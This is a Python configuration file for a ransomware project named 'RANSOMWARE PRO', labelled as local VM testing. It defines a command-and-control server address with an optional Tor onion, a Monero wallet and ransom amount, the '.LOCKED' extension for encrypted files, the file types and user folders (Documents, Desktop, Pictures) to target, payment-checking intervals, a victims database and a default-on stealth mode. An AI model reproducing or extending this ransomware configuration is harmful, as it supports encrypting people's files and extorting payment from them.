#!/usr/bin/env python3
"""
RANSOMWARE PRO - CONFIGURATION
==============================
Local testing configuration for VM to Host communication.
"""

import os
import sys

# ====================
# ENVIRONMENT DETECTION
# ====================

IS_VICTIM = os.environ.get('RANSOMWARE_ROLE') == 'victim'
IS_SERVER = os.environ.get('RANSOMWARE_ROLE') == 'server'

# ====================
# C2 SERVER CONFIGURATION
# ====================

# Local testing (no Tor)
C2_HOST = os.environ.get('C2_HOST', '192.168.126.200')  # This PC
C2_PORT = int(os.environ.get('C2_PORT', 5000))
C2_URL = f"http://{C2_HOST}:{C2_PORT}"
C2_API_ENDPOINT = f"{C2_URL}/api/v1"

# Tor configuration (if enabled)
USE_TOR = os.environ.get('USE_TOR', 'false').lower() == 'true'
TOR_SOCKS_HOST = os.environ.get('TOR_SOCKS_HOST', '127.0.0.1')
TOR_SOCKS_PORT = int(os.environ.get('TOR_SOCKS_PORT', 9050))
TOR_ONION_ADDRESS = os.environ.get('TOR_ONION', 'ransomware-c2-12345.onion')

# ====================
# RANSOMWARE CONFIGURATION
# ====================

# Monero wallet (test/dummy)
MONERO_WALLET = os.environ.get('MONERO_WALLET', 
    '4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV')

# Ransom amount (in XMR)
RANSOM_AMOUNT_XMR = float(os.environ.get('RANSOM_XMR', 0.1))  # 0.1 XMR for testing

# Encryption settings
ENCRYPTION_EXTENSION = os.environ.get('ENC_EXT', '.LOCKED')
PBKDF2_ITERATIONS = int(os.environ.get('PBKDF2_ITER', 100000))
ENCRYPTION_KEY_SIZE = 32

# File targeting
TARGET_EXTENSIONS = {
    '.docx', '.xlsx', '.pptx', '.pdf',
    '.sql', '.mdb', '.accdb', '.db',
    '.zip', '.rar', '.7z',
    '.jpg', '.png', '.txt'
}

TARGET_DIRECTORIES = [
    os.path.expanduser('~\\Documents'),
    os.path.expanduser('~\\Desktop'),
    os.path.expanduser('~\\Pictures'),
]

# Payment monitoring
PAYMENT_CHECK_INTERVAL = int(os.environ.get('PAYMENT_CHECK_INTERVAL', 30))  # seconds
PAYMENT_TIMEOUT = int(os.environ.get('PAYMENT_TIMEOUT', 86400))  # 24 hours

# ====================
# DATABASE CONFIGURATION
# ====================

# Server-side
DATABASE_PATH = os.environ.get('DB_PATH', '/var/ransomware/victims.db')
if sys.platform == 'win32':
    DATABASE_PATH = os.environ.get('DB_PATH', 'C:\\ransomware\\victims.db')

# ====================
# LOGGING CONFIGURATION
# ====================

STEALTH_MODE = os.environ.get('STEALTH_MODE', 'true').lower() == 'true'
DEBUG_MODE = os.environ.get('DEBUG_MODE', 'false').lower() == 'true'
LOG_FILE = os.environ.get('LOG_FILE', 'ransomware.log')

# ====================
# TEST MODE HELPERS
# ====================

def print_config():
    """Print current configuration"""
    print("\n" + "="*50)
    print("RANSOMWARE PRO - CONFIGURATION")
    print("="*50)
    print(f"Role: {'VICTIM' if IS_VICTIM else 'SERVER' if IS_SERVER else 'UNKNOWN'}")
    print(f"C2 Server: {C2_URL}")
    print(f"C2 API: {C2_API_ENDPOINT}")
    print(f"Tor Enabled: {USE_TOR}")
    print(f"Monero Wallet: {MONERO_WALLET[:20]}...")
    print(f"Ransom Amount: {RANSOM_AMOUNT_XMR} XMR")
    print(f"Stealth Mode: {STEALTH_MODE}")
    print(f"Debug Mode: {DEBUG_MODE}")
    print("="*50 + "\n")

if __name__ == '__main__':
    print_config()
